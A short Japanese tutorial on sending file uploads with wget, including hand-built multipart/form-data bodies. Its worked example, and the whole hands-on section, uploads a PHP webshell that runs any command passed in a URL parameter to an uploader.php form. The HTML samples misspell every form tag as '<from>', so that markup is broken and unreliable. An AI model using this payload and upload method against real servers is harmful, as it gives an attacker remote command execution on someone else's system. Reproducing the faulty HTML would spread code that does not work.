# wget で ファイルを POST する方法

よくある値をPOSTするHTMLの書き方は次のとおり。

```
<from action='sender.php' method='POST'>
<input type='text' name='name' value='name_value' />
<input type='password' name='pass' value='pass_value' />
<input type='submit' value='Send' />
</from>
```

このときwgetでPOSTするときの書き方は次のとおり。

```
wget --post-data='name=name_value&pass=pass_value' https://example.jp/sender.php
```

ファイルをPOSTするときのHTMLは次のとおり。

```
<from enctype='multipart/form-data' action='uploader.php' method='POST'>
<input type='hidden' name='name' value='value' />
<input type='file' name='userfile' />
<input type='submit' value='Upload' />
</from>
```

ググると次のような書き方でアップロードできると書いてるウエブページをよく見るが、これではファイルをPOSTできても、受け取る側がファイルを直接送られてくることを想定して作られていないと有効であない。

```
wget --post-file='webshell.php' https://example.jp/uploader.php
```

from タグに「enctype='multipart/form-data'」とあるときは次のような書き方をする必要がある。

```
wget --header='Content-Type: multipart/form-data; boundary=(任意英数字列)' --post-file='webshell.php_for_post' https://example.jp/uploader.php
```
* (任意英数字列) はすべて同じ文字列。

[webshell.php_for_post の内容]
```
--(任意英数字列)
Content-Disposition: form-data; name="name"

value
--(任意英数字列)
Content-Disposition: form-data; name="userfile"; filename="webshell.php"
Content-Type: text/plain

<?php

system($_GET['April']);
--(任意英数字列)

```

* 解説

```
--(任意英数字列)
Content-Disposition: form-data; name="name"

value
```
上記は from 内の以下に対応している。

```
<input type='hidden' name='name' value='value' />
```

---

```
--(任意英数字列)
Content-Disposition: form-data; name="userfile"; filename="webshell.php"
Content-Type: text/plain

<?php

system($_GET['April']);
```

上記は from 内の以下で websehll.php を指定したことに対応している。

filename="webshell.php" の部分でファイル名を指定する。

```
<input type='file' name='userfile' />
```

指定した webshell.php の内容は以下のとおり。

[ webshell.php の内容 ]
```
<?php

system($_GET['April']);
```
---

```
--(任意英数字列)
```

最後行の上記は指定したファイルがここまでであることを示している。

## 実際にやってみよう

以下の内容のファイルを用意。ファイル名を webshell.php_for_post とする。

```
--0123456789
Content-Disposition: form-data; name="name"

value
--0123456789
Content-Disposition: form-data; name="userfile"; filename="webshell.php"
Content-Type: text/plain

<?php

system($_GET['April']);
--0123456789
```

```
wget --header='Content-Type: multipart/form-data; boundary=0123456789' --post-file='webshell.php_for_post' https://example.jp/uploader.php
```